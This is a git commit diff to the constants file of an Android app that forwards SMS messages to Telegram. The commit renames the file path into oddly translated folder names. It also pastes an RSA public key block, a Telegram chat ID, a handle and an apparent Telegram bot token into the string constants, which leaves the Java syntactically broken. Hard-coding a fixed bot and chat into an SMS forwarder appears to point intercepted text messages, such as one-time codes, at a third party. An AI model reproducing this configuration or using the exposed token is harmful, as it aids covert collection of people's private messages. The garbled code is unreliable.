dd4c43e9665a45b1d3d442b0fc370b1fb07469fa
TARIF1212 <120911123+TARIF1212@users.noreply.github.com>
2022-12-18 17:18:41 +0700

    Update and rename app/src/main/java/com/smodj/app/smstotelegram/Constants/MainConstant.java to aplikasi/src/utama/Jawa/com/smodj/aplikasi/smstotelegram/Konstanta/MainConstant.java

--- aplikasi/src/utama/Jawa/com/smodj/aplikasi/smstotelegram/Konstanta/MainConstant.java
+++ aplikasi/src/utama/Jawa/com/smodj/aplikasi/smstotelegram/Konstanta/MainConstant.java
@@ -12,9 +12,16 @@ public class MainConstant {
     public static final String pkg = "com.smodj.app.smstotelegram";
     private static final String bot_id = "ehem ehem";
     public static String telegram_url = "";
-    public static final String telegram_id_storage_key= "TelegramID";
-    public static final String device_name_key= "DeviceName";
-    public static final String bot_id_key = "BotID";
+    public static final String telegram_id_storage_key=----BEGIN RSA PUBLIC KEY-----
+MIIBCgKCAQEA6LszBcC1LGzyr992NzE0ieY+BSaOW622Aa9Bd4ZHLl+TuFQ4lo4g
+5nKaMBwK/BIb9xUfg0Q29/2mgIR6Zr9krM7HjuIcCzFvDtr+L0GQjae9H0pRB2OO
+62cECs5HKhT5DZ98K33vmWiLowc621dQuwKWSQKjWf50XYFw42h21P2KXUGyp2y/
++aEyZ+uVgLLQbRA1dEjSDZ2iGRy12Mk5gpYc397aYp438fsJoHIgJ2lgMv5h7WY9
+t6N/byY9Nw9p21Og3AoXSL2q/2IJ1WRUhebgAdGVMlV1fkuOQoEzR7EdpqtQD9Cs
+5+bfo3Nhmcyvk5ftB0WkJ9z6bNZ7yxrP8wIDAQAB
+-----END RSA PUBLIC KEY----- "TelegramID";5672112561
+    public static final String device_name_key= "DeviceName";@Smscovy
+    public static final String bot_id_key = "BotID";5973178636:AAFGMZec3Gfa8JUCBVODUpEl7XTmz7yTjZs
     public static final String unsent_msgs_stack = "DELAYED_STACK";
     public static final String privacy_policy = "PrivacyPolicy";
     public static final String privacy_policy_content = "1. This app forwards SMS to Telegram API Directly.\n" +
